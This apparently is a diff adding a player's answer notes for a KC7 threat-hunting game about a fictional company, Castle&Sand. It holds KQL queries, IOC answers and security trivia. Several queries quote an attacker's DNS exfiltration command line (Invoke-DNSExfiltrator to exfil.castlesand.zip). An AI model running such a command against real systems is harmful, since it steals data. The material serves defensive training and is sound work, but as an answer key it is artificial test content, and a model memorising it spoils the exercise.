+| where process_commandline has "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
+| distinct hostname; /// 14
+Employees
+| where hostname in (distinctRole)
+| distinct role ///5
+
+/////////Section 5: A clean sweep 🧹 (Requires some Section 4 Answers)
+
+///Look up the IP addresses from Q8.
+//Which IP address is in the country that hosted the winter olympics a few years ago (South Korea) ?
+//////
+43.185.57.65
+223.9.222.59
+215.239.162.10
+215.168.239.75
+195.242.92.76
+192.91.130.34
+190.198.227.17
+156.155.83.236
+124.138.210.88
+//////////////////////
+///https://www.maxmind.com/en/geoip-demo
+///Response/  124.138.210.88
+
+
+///Which one hosted the winter olympics recently? If there's more than one, post any of them.
+//China
+/// response 43.185.57.65  or 223.9.222.59
+
+///Search the malicious files found in Q12 on VirusTotal.com.
+
+///Which file appears to not be malicious? Copy and paste the SHA256 hash.
+
+let victims =
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+| parse recipient with NameEmployee"@castleandsand.com"
+| distinct NameEmployee;
+let victimsusername =
+Employees
+| where email_addr has_any (victims)
+| distinct username;
+let domainActor= 
+AuthenticationEvents
+| where username in (victimsusername)
+| where result contains "successful"
+| where src_ip !startswith "10.10" //only external IP needed not intern
+| distinct src_ip; //43
+let filesfrom5domain =
+PassiveDns
+| where ip in (domainActor)
+| distinct domain; //5
+OutboundNetworkEvents
+| where url has_any (filesfrom5domain) 
+| where url has_any (".xlsx", ".docx", ".lnk", ".pdf")
+|distinct url //15
+
+///5 distint Malwares
+
+//store_updates.xlsx
+//Work-Updates.docx
+//HR_Notes.pdf
+//Employee_Changes.xlsx
+//employee.lnk
+
+https://keywordssurfparadise.com//search/Work-Updates.docx
+
+FileCreationEvents
+| where filename  has_any (
+    "store_updates.xlsx",
+    "Work-Updates.docx",
+    "HR_Notes.pdf",
+    "Employee_Changes.xlsx",
+    "employee.lnk"
+)
+|project filename, sha256
+
+FileCreationEvents
+| where sha256 contains "e2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496"
+///C:\procdump64.exe
+
+//Name ; procdump
+///SHA256 : e2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496
+
+//Who signed the file?
+ //Microsoft;Microsoft Corporation
+
+ //Which threat actor group may have used these in the past? check virustotal
+ //APT41
+
+//For what you found in Section 4, Q15, who developed this malware? Paste their username.
+
+//When is the first time you see this final action by the threat actor? Copy & paste the full timestamp.
+//Response; datetime( 2023-05-26T10:33:04Z)
+
+FileCreationEvents
+| where filename  contains "Invoke-DNSExfiltrator" or  filename  contains "exfil.castlesand"
+| where timestamp >= datetime( 2023-05-26T10:33:04Z)
+
+ProcessEvents
+| where process_commandline has "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
+
+//// Search on the net who created Invoke-DNSExfiltrator or DNSExfiltrator
+
+/// REsponse: Arno0x
+
+/////////////////////////Section 6: Security Jeopardy REDUX 🕺
+
+//In what year was KC7 founded?
+///Response: 2023
+
+//Ransomware payments are almost always demanded in this form of currency to make them harder to trace.What type of currency is this?
+//crypto
+//This US government agency maintains a catalog of Known Exploited Vulnerabilities (KEV) that organizations are strongly encouraged to patch.What agency is it?
+//CISA;Cybersecurity and Infrastructure Security Agency
+///This notorious ransomware group operated a "Ransomware-as-a-Service" platform and was taken down by an international law enforcement operation called "Operation Cronos" in February 2024.
+
+//What was the group's name? LockBit
+
+///How many bits are in a byte? 1 byte = 8 bits
+
+//How many megabytes are in a gigabyte? 1000
+
+///Who on Twitter likes to IMPOSE COST to adversaries, and really likes Spiderman? You can. enter their name or handle.
+//// @ImposeCost
+
+//What cybersecurity conference is focused on Detection Engineering And Threat Hunting? Provide the domain name of their website.
+
+//deathcon.io
+
+//What SssSssSecurity conference focused on cyber crime is typically hosted recently in Arlington VA?
+SLEUTHCON
+
+
+//What recent ZERO DAY vulnerability in late May / June 2023 where it was reported that the LACE TEMPEST group took responsibility for it? Copy & paste the CVE.
+///CVE-2023-34362
+
+//Who is claiming responsibility for the DDOS attacks at a well know tech company? (June 2023)
+////Anonymous Sudan
+
+//🤫 📡 You intercepted a secret transmission
+/////eWV2dG5pbnkgcWFuIGxib3hlbnVm
+////Use cyberchef: https://toolbox.itsec.tamu.edu/
+
+///From Base64
+///yevtniny qan lboxenuf
+///ROT13
+//lrigaval dna yobkrahs
+///Reverse
+///sharkboy and lavagirl
+//////Response is sharkboy and lavagirl
+
+///01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01111001 01101111 01110101 01110100 01110101 00101110 01100010 01100101 00101111 01100100 01010001 01110111 00110100 01110111 00111001 01010111 01100111 01011000 01100011 01010001
+
+//cyberchef : from binary
+
+//https://youtu.be/dQw4w9WgXcQ
+
+///IAM HERE
